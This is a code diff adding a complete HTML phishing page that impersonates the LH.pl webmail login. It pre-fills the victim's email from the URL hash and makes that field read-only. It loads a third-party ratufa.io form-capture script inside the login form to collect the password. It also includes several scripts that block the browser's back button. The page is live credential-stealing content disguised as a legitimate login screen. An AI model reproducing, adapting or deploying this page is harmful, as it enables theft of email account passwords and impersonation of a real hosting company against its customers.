@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LH.pl - Logowanie</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 80px 20px 40px;
+            position: relative;
+        }
+
+        /* Top Logo Graphic Reproduction */
+        .logo-container {
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .logo-text {
+            font-size: 46px;
+            font-weight: 900;
+            color: #0056da;
+            letter-spacing: -2px;
+        }
+
+        .logo-text span {
+            font-size: 20px;
+            font-weight: bold;
+            letter-spacing: 0px;
+            text-transform: uppercase;
+            margin-left: 2px;
+        }
+
+        /* Form Main Wrapper */
+        .login-box {
+            width: 100%;
+            max-width: 320px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-row {
+            display: flex;
+            width: 100%;
+            height: 44px;
+            margin-bottom: 1px; /* Creates the subtle gap line */
+        }
+
+        /* Gray icon block matching layout */
+        .icon-box {
+            width: 44px;
+            background-color: #f5f5f5;
+            border: 1px solid #dcdcdc;
+            border-right: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #444444;
+            font-size: 14px;
+        }
+
+        .form-control {
+            flex: 1;
+            padding: 0 14px;
+            border: 1px solid #dcdcdc;
+            font-size: 15px;
+            outline: none;
+            color: #333333;
+        }
+
+        /* Active field focused with signature bright cyan border */
+        .input-row.focused .icon-box {
+            border-color: #32b8ff;
+        }
+        .input-row.focused .form-control {
+            border-color: #32b8ff;
+        }
+
+        .form-control::placeholder {
+            color: #b5b5b5;
+        }
+
+        /* Signature Cyan Submit Button */
+        .submit-btn {
+            width: 100%;
+            background-color: #32b8ff;
+            color: #ffffff;
+            border: none;
+            height: 38px;
+            font-size: 13px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            margin-top: 1px;
+            transition: background-color 0.15s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #1aaeff;
+        }
+
+        /* Sub-link branding message description */
+        .sub-message {
+            text-align: center;
+            margin-top: 16px;
+            color: #888888;
+            font-size: 12px;
+        }
+
+        /* Bottom Circular Promotion Badges Grid Components */
+        .promo-section {
+            margin-top: 100px;
+            display: flex;
+            gap: 40px;
+            justify-content: center;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .promo-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        /* Precise dotted circular outline decoration */
+        .circle-icon {
+            width: 90px;
+            height: 90px;
+            border: 1.5px dashed #0056da;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: #0056da;
+            margin-bottom: 16px;
+            transition: transform 0.2s ease;
+        }
+
+        .promo-item:hover .circle-icon {
+            transform: scale(1.05);
+        }
+
+        .promo-title {
+            font-size: 13px;
+            color: #0056da;
+            text-decoration: underline;
+        }
+
+        /* Fixed Background Desktop System Watermark Overlay Component */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(0, 0, 0, 0.15);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main Branding Header Icon -->
+    <div class="logo-container">
+        <div class="logo-text">LH<span>.pl</span></div>
+    </div>
+                
+    <!-- Center Login Processing Form Structure -->
+    <div class="login-box">
+        <form action="" method="POST">
+            <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=wyob9cof&n=n1.ratufa.io"></script>
+            <!-- Focused row using custom cyan outline configuration styles -->
+            <div class="input-row focused">
+                <div class="icon-box">👤</div>
+                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" /><br><p>
+            </div>
+            
+            <div><div class="input-row">
+                <div class="icon-box">🔒</div><br>
+<br><input type="password" name="Password" placeholder="haslo" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+            </div><br>
+            
+            <button type="submit" class="submit-btn">Login</button>
+        </form>
+        <div class="sub-message">LH Poczta</div>
+    </div>
+
+    <!-- Bottom Marketing Badge Element Components Grid -->
+    <div class="promo-section">
+        <div class="promo-item">
+            <div class="circle-icon">🖥️</div>
+            <div class="promo-title">Hosting WWW</div>
+        </div>
+        <div class="promo-item">
+            <div class="circle-icon">🌐</div>
+            <div class="promo-title">Domeny</div>
+        </div>
+    </div>
+
+    <!-- Windows Environment Activation Notification Simulation Overlay Layer -->
+    <div class="system-watermark">
+        Activate Windows<br>
+        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
+    </div>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
